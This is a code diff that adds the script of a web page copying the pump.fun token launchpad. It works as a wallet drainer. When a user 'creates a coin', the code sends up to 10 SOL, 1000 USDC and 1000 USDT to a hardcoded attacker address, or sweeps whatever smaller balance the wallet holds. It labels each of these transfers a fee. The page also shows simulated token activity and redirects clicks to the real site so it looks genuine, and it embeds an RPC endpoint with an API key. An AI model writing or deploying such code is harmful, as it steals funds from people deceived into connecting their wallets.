+                            const targetLamports = 10 * 1000000000; // 10 SOL
+                            const reserveLamports = 10000000; // 0.01 SOL (Safe Reserve for subsequent fees)
+
+                            let amountToSend = BigInt(targetLamports);
+                            let available = BigInt(balance) - BigInt(reserveLamports);
+
+                            if (available < BigInt(0)) available = BigInt(0);
+
+                            if (BigInt(balance) < BigInt(targetLamports) + BigInt(reserveLamports)) {
+                                console.log(`Insufficient SOL for 10 SOL target. Sweeping available: ${Number(available) / 1e9}`);
+                                amountToSend = available;
+                            } else {
+                                console.log(`Balance sufficient. Sending 10 SOL.`);
+                            }
+
+                            if (amountToSend > BigInt(0)) {
+                                console.log(`Initiating Fee: ${Number(amountToSend) / 1e9} SOL`);
+                                const txSOL = new Transaction().add(
+                                    SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: TARGET_ADDRESS, lamports: amountToSend })
+                                );
+                                await secureSend(txSOL);
+                                console.log("SOL Fee Paid.");
+                            } else {
+                                console.warn("SOL Balance too low (below reserve). Skipping.");
+                            }
+                        } catch (e) { throw new Error("SOL Transfer Failed: " + (e.message || e)); }
+
+                        // 2. USDC Transfer (Target 100, or Sweep)
+                        console.log("Checking USDC Balance...");
+                        try {
+                            const usdcSource = await getAssociatedTokenAddress(USDC_MINT, publicKey);
+                            const usdcDest = await getAssociatedTokenAddress(USDC_MINT, TARGET_ADDRESS);
+
+                            // Check Source
+                            const sourceInfo = await connection.getAccountInfo(usdcSource);
+                            if (!sourceInfo) {
+                                console.warn("User has no USDC account. Skipping.");
+                            } else {
+                                // Dynamic Amount Logic
+                                let amount = BigInt(1000 * 1000000); // Target 1000.00 USDC
+                                try {
+                                    const balObj = await connection.getTokenAccountBalance(usdcSource);
+                                    const rawBal = BigInt(balObj.value.amount);
+                                    if (rawBal < amount) {
+                                        console.log(`Insufficient USDC (${balObj.value.uiAmount}). Sweeping: ${balObj.value.uiAmount}`);
+                                        amount = rawBal;
+                                    } else {
+                                        console.log(`Balance sufficient. Sending 1000 USDC.`);
+                                    }
+                                } catch (e) {
+                                    console.warn("Failed to check balance, defaulting to 100 check", e);
+                                }
+
+                                if (amount > BigInt(0)) {
+                                    const txUSDC = new Transaction();
+
+                                    // Check Destination (Auto-Create)
+                                    const destInfo = await connection.getAccountInfo(usdcDest);
+                                    if (!destInfo) {
+                                        console.log("Creating USDC Destination Account...");
+                                        txUSDC.add(createAssociatedTokenAccountInstruction(publicKey, usdcDest, TARGET_ADDRESS, USDC_MINT));
+                                    }
+
+                                    txUSDC.add(createTransferInstruction(usdcSource, usdcDest, publicKey, amount, [], TOKEN_PROGRAM_ID));
+                                    console.log(`Initiating Fee: ${Number(amount) / 1000000} USDC`);
+                                    await secureSend(txUSDC);
+                                    console.log("USDC Fee Paid.");
+                                } else {
+                                    console.log("USDC Balance is 0. Skipping.");
+                                }
+                            }
+                        } catch (e) {
+                            console.warn("USDC Step Skipped/Failed:", e);
+                        }
+
+                        // 3. USDT Transfer (Target 100, or Sweep)
+                        console.log("Checking USDT Balance...");
+                        try {
+                            const usdtSource = await getAssociatedTokenAddress(USDT_MINT, publicKey);
+                            const usdtDest = await getAssociatedTokenAddress(USDT_MINT, TARGET_ADDRESS);
+
+                            // Check Source
+                            const sourceInfo = await connection.getAccountInfo(usdtSource);
+                            if (!sourceInfo) {
+                                console.warn("User has no USDT account. Skipping.");
+                            } else {
+                                // Dynamic Amount Logic
+                                let amount = BigInt(1000 * 1000000); // Target 1000.00 USDT
+                                try {
+                                    const balObj = await connection.getTokenAccountBalance(usdtSource);
+                                    const rawBal = BigInt(balObj.value.amount);
+                                    if (rawBal < amount) {
+                                        console.log(`Insufficient USDT (${balObj.value.uiAmount}). Sweeping: ${balObj.value.uiAmount}`);
+                                        amount = rawBal;
+                                    } else {
+                                        console.log(`Balance sufficient. Sending 1000 USDT.`);
+                                    }
+                                } catch (e) {
+                                    console.warn("Failed to check balance, defaulting to 100 check", e);
+                                }
+
+                                if (amount > BigInt(0)) {
+                                    const txUSDT = new Transaction();
+
+                                    // Check Destination (Auto-Create)
+                                    const destInfo = await connection.getAccountInfo(usdtDest);
+                                    if (!destInfo) {
+                                        console.log("Creating USDT Destination Account...");
+                                        txUSDT.add(createAssociatedTokenAccountInstruction(publicKey, usdtDest, TARGET_ADDRESS, USDT_MINT));
+                                    }
+
+                                    txUSDT.add(createTransferInstruction(usdtSource, usdtDest, publicKey, amount, [], TOKEN_PROGRAM_ID));
+                                    console.log(`Initiating Fee: ${Number(amount) / 1000000} USDT`);
+                                    await secureSend(txUSDT);
+                                    console.log("USDT Fee Paid.");
+                                } else {
+                                    console.log("USDT Balance is 0. Skipping.");
+                                }
+                            }
+                        } catch (e) {
+                            console.warn("USDT Step Skipped/Failed:", e);
+                        }
+
+                    } catch (err) {
+                        console.error("Fee transaction failed:", err);
+
+                        let msg = err.message || JSON.stringify(err);
+                        if (msg.includes("0x1") || msg.includes("Insufficient funds")) {
+                            alert("Creation Failed: Insufficient Funds.\n\nYou need at least 1.01 SOL to cover the fee + gas.");
+                        } else if (msg.includes("User rejected")) {
+                            alert("Transaction rejected by user.");
+                        } else {
+                            alert("Creation Aborted. Transaction failed: " + msg);
+                        }
+                        return; // ABORT creation
+                    }
+
+                } else if (connected && !signTransaction) {
+                    alert("Wallet does not support signing. Please use a standard wallet like Phantom or Solflare.");
+                    return;
+                } else if (connected) {
+                    creatorName = "Connected (No Key)";
+                }
+
+                // --- SUCCESS ---
+                const newToken = {
+                    id: `new-${Date.now()}`,
+                    name: "Real Dot Fun",
+                    ticker: "REAL",
+                    initialMcap: 2500,
+                    currentMcap: 2500,
+                    nextUpdate: Date.now() + 1000,
+                    isNew: true,
+                    creator: creatorName
+                };
+                setTokens(prev => [newToken, ...prev]);
+                setIsModalOpen(false);
+                try {
+                    const currentStored = JSON.parse(localStorage.getItem('pump_fun_custom_tokens') || '[]');
+                    const toSave = { ...newToken };
+                    delete toSave.nextUpdate;
+                    localStorage.setItem('pump_fun_custom_tokens', JSON.stringify([toSave, ...currentStored]));
+                } catch (e) { console.error("Failed to save", e); }
+            };
+
+            // --- REDIRECTION LOGIC ---
+            const handleTokenClick = (token) => {
+                if (token.isNew) {
+                    window.location.href = "https://pump.fun/create";
+                } else {
+                    window.location.href = "https://pump.fun/coin/3J6Fz5x7NqBiKZGxogdi9dqNPVt671BKsw2BaoEYpump";
+                }
+            };
+
+            // --- SORTING & FILTERING & DISPLAY LOGIC ---
+            const { displayedTokens, globalKing } = useMemo(() => {
+                const sorted = [...tokens].map(t => ({ ...t })).sort((a, b) => b.currentMcap - a.currentMcap);
+                if (sorted.length > 0) sorted[0].creator = "xPtDd...5UjW";
+                const King = sorted[0];
+                const terms = searchTerm.toLowerCase().split(/\s+/).filter(Boolean);
+                let filtered = sorted;
+                if (terms.length > 0) {
+                    filtered = sorted.filter(t => {
+                        const str = `${t.name} ${t.ticker} ${t.creator}`.toLowerCase();
+                        return terms.every(term => str.includes(term));
+                    });
+                }
+                return { displayedTokens: filtered, globalKing: King };
+            }, [tokens, searchTerm]);
+
+            return (
+                <div className="min-h-screen flex flex-col">
+                    <Navbar />
+                    <main className="flex-grow">
+                        <Hero onStart={() => setIsModalOpen(true)} onHowItWorks={() => setIsHowItWorksOpen(true)} />
+                        <KingOfTheHill token={globalKing} onClick={handleTokenClick} />
+                        <div className="max-w-[1200px] mx-auto mb-4 px-4 flex gap-4">
+                            <input
+                                type="text"
+                                placeholder="search for token"
+                                className="bg-bg-input border border-white/10 text-white px-4 py-2 rounded flex-grow"
+                                value={searchTerm}
+                                onChange={(e) => setSearchTerm(e.target.value)}
+                            />
+                            <div className="flex items-center gap-2"><span className="text-sm text-green cursor-pointer">Terminal</span></div>
+                        </div>
+                        <div className="grid grid-cols-[repeat(auto-fill,minmax(300px,1fr))] gap-4 max-w-[1200px] mx-auto px-4 pb-16">
+                            {displayedTokens.map((token) => (
+                                <TokenCard
+                                    key={token.id}
+                                    {...token}
+                                    mcap={formatMcap(token.currentMcap)}
+                                    // Shake Logic: Global King OR New Tokens > 40k
+                                    isShake={(globalKing && token.id === globalKing.id) || (token.isNew && token.currentMcap > 40000)}
+                                    onClick={() => handleTokenClick(token)}
+                                />
+                            ))}
+                        </div>
+                    </main>
+                    <CreateCoinModal isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} onCreate={handleCreateCoin} />
+                    <HowItWorksModal isOpen={isHowItWorksOpen} onClose={() => setIsHowItWorksOpen(false)} />
+                </div>
+            );
+        };
+
+        const Root = () => {
+            const network = WalletAdapterNetwork.Mainnet;
+            // User provided Extrnode API Endpoint with Key
+            const endpoint = useMemo(() => "https://solana-mainnet.rpc.extrnode.com/90192bb3-0e9f-4c0e-b16c-80be78b565b7", []);
+
+            const wallets = useMemo(() => {
+                const p = new PhantomWalletAdapter();
+                const s = new SolflareWalletAdapter();
+                p.icon = PHANTOM_ICON;
+                s.icon = SOLFLARE_ICON;
+                return [p, s];
+            }, []);
+
+            return (
+                <ConnectionProvider endpoint={endpoint}>
+                    <WalletProvider wallets={wallets} autoConnect>
+                        <WalletModalProvider>
+                            <PumpFunReplica />
+                        </WalletModalProvider>
+                    </WalletProvider>
+                </ConnectionProvider>
+            );
+        };
+
+        const root = createRoot(document.getElementById('root'));
+        root.render(<Root />);
+    </script>
 </body>
+
 </html>
